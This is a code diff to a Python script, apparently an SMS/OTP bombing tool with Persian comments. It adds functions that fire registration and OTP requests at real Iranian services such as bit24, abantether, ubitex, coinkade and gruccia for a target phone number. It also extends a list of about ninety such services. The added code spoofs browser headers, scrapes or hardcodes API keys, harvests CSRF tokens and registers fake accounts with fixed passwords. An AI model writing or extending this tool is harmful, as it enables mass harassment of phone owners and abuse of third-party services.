@@ -69,6 +69,367 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+
+def bit24(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = clean_phone[2:]
+        elif clean_phone.startswith('0'):
+            clean_phone = clean_phone[1:]
+        
+        if not re.match(r"^9\d{9}$", clean_phone):
+            return False
+
+        url = "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code"
+        
+        payload = {
+            "country_code": "98",
+            "mobile": "0" + clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://bit24.cash"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+
+def abantether(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.abantether.com/api/v2/auths/register/phone/send"
+        
+        payload = {
+            "phone_number": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Accept-Language": "fa",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://abantether.com",
+            "Referer": "https://abantether.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def ompfinex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.ompfinex.com/v2/user/sign-up"
+        
+        payload = {
+            "username": clean_phone
+        }
+        
+        headers = {
+            "x-platform": "web",
+            "ngsw-bypass": "1",
+            "x-version": "307",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://ompfinex.com",
+            "Referer": "https://ompfinex.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def ubitex(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج API Key
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        }
+        
+        response = session.get("https://ubitex.io/", headers=headers, timeout=10)
+        
+        # استخراج API Key و Secret از صفحه
+        api_key = "1b285fe3-935f-43f2-9a12-0eaace9f0607"  # مقدار پیشفرض
+        api_secret = "8d91944f-ee3c-4d44-9826-6275148637ec"  # مقدار پیشفرض
+        
+        # جستجو در JavaScript برای API Key
+        api_key_match = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
+        api_secret_match = re.search(r'apiSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
+        
+        if api_key_match:
+            api_key = api_key_match.group(1)
+        if api_secret_match:
+            api_secret = api_secret_match.group(1)
+
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.ubitex.io/api/member/v2/register"
+        
+        payload = {
+            "EmailOrMobile": clean_phone,
+            "Password": "Test123!@#",
+            "phone": clean_phone,
+            "ConfirmPassword": "Test123!@#"
+        }
+        
+        headers = {
+            "apiSecret": api_secret,
+            "apiKey": api_key,
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://ubitex.io",
+            "Referer": "https://ubitex.io/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            return response.status_code == 400
+
+    except Exception:
+        return False
+        
+          
+def sarmayex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = f"https://api.sarmayex.com/api/v2/otp?receiver={clean_phone}&otp_type=SMS&otp_section=REGISTER"
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Client-Type": "pwa",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://sarmayex.com",
+            "Referer": "https://sarmayex.com/"
+        }
+
+        response = requests.get(url, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def coinkade(phone):
+    try:
+        # پاکسازی و فرمت شماره
+        phone = phone.replace('+', '').replace(' ', '')
+        if phone.startswith('98'):
+            phone = '0' + phone[2:]
+        elif not phone.startswith('0'):
+            phone = '0' + phone
+
+        if not re.match(r"^09\d{9}$", phone):
+            print(f"{r}[!] Coinkade: شماره نامعتبر{a}")
+            return False
+
+        # دریافت CSRF token
+        get_url = f"https://api.coinkade.biz/user/get-user/{phone}?recaptchaValue="
+        resp = requests.get(get_url, timeout=10)
+        csrf = resp.json().get("csrfToken")
+        if not csrf:
+            print(f"{r}[!] Coinkade: نتونستم CSRF پیدا کنم!{a}")
+            return False
+        print(f"{g}[+] Coinkade: CSRF گرفته شد{a}")
+
+        # ارسال OTP
+        post_url = "https://api.coinkade.biz/otp-code?recaptchaValue="
+        payload = {"username": phone, "csrfToken": csrf}
+        headers = {
+            "Authorization": f"Bearer {csrf}",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
+            "Origin": "https://coinkade.biz",
+            "Referer": "https://coinkade.biz/"
+        }
+
+        response = requests.post(post_url, json=payload, headers=headers, timeout=10)
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Coinkade: کد ارسال شد!{a}")
+            return True
+        print(f"{r}[-] Coinkade: خطا در ارسال ({response.status_code}){a}")
+        return False
+
+    except Exception as e:
+        print(f"{r}[!] Coinkade Exception: {e}{a}")
+        return False
+        
+def twox(phone):
+    try:
+        # پاکسازی و فرمت شماره
+        phone = phone.replace('+', '').replace(' ', '')
+        if phone.startswith('98'):
+            phone = '0' + phone[2:]
+        elif not phone.startswith('0'):
+            phone = '0' + phone
+
+        if not re.match(r"^09\d{9}$", phone):
+            print(f"{r}[!] Twox: شماره نامعتبر{a}")
+            return False
+
+        url = f"https://api.twox.ir/api/accounts/signin?username={phone}&otpKind=1"
+        payload = {
+            "token": "اینجا JWT توکن خود سایت یا session خود را قرار بده"
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "fa-IR",
+            "x-agent-source": "web mobile",
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Twox: کد OTP ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] Twox: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] Twox Exception: {e}{a}")
+        return False
+        
+def arzunex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"{r}[!] ArzUnex: شماره نامعتبر{a}")
+            return False
+
+        url = "https://arzunex.ir/core/api/v2/public/customer/auth/otp/generate"
+        payload = {"mobile": clean_phone}
+        headers = {
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code in [200, 201]:  # تغییر این خط
+            print(f"{g}[+] ArzUnex: OTP ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] ArzUnex: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] ArzUnex Exception: {e}{a}")
+        return False
+        
+    
+def gruccia(phone, firstname="نام", lastname="نام‌خانوادگی", password="123456Mm@"):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"{r}[!] Gruccia: شماره نامعتبر{a}")
+            return False
+
+        url = "https://gruccia.ir/login?back=my-account"
+        payload = {
+            "username": clean_phone,
+            "id_customer": "",
+            "back": "",
+            "firstname": firstname,
+            "lastname": lastname,
+            "password": password,
+            "action": "register",
+            "ajax": "1"
+        }
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Gruccia: درخواست ثبت نام ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] Gruccia: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] Gruccia Exception: {e}{a}")
+        return False
+        
 def booking(phone):
     try:
         session = requests.Session()
@@ -3362,15 +3723,16 @@ def iranhotel(phone):
 # ==========================
 
 services = [
-    accounts1606, achareh, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus, azkivam, Balad, banimode,
-    barghman, Besparto, bimebazar, bitpin, bodoroj, booking, candom_shop, Charsooq, charter118, dastakht,
-    dgshahr, digikala, DigikalaJet, divar, drnext, drto, elanza, fadaktrains, gap, gapfilm,
-    ghasedak24, hajamooo, harikashop, ilozi, iranhotel, instagram_send, katonikhan, katoonistore, komodaa, Koohshid,
-    mahabadperfume, malltina, masterkala, mek, missomister, mo7_ir, mobilex, mootanroo, mrbilit, mydigipay,
-    nikpardakht, niktakala, Okala, okorosh, otaghak, paklean_call, payaneh, payonshoes, pindo, pinket,
-    ragham_call, raastin, riiha, Sandalestan, ShahreSandal, shahrfarsh, sibapp, sibbank, smarket, snapp,
-    snappshop, tabdeal, tapsi, tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip,
-    trip_call, vakiljo, virgool, vitrin_shop
+    abantether, accounts1606, achareh, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus, arzunex, azkivam,
+    Balad, banimode, barghman, Besparto, bimebazar, bit24, bitpin, bodoroj, booking, candom_shop,
+    Charsooq, charter118, coinkade, dastakht, dgshahr, digikala, DigikalaJet, divar, drnext, drto,
+    elanza, fadaktrains, gap, gapfilm, ghasedak24, gruccia, hajamooo, harikashop, ilozi, iranhotel,
+    instagram_send, katonikhan, katoonistore, komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, missomister,
+    mo7_ir, mobilex, mootanroo, mrbilit, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak,
+    ompfinex, paklean_call, payaneh, payonshoes, pindo, pinket, ragham_call, raastin, riiha, Sandalestan,
+    ShahreSandal, shahrfarsh, sibapp, sibbank, sarmayex, smarket, snapp, snappshop, tabdeal, tapsi,
+    tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip, trip_call, twox, ubitex,
+    vakiljo, virgool, vitrin_shop
 ]
 
 
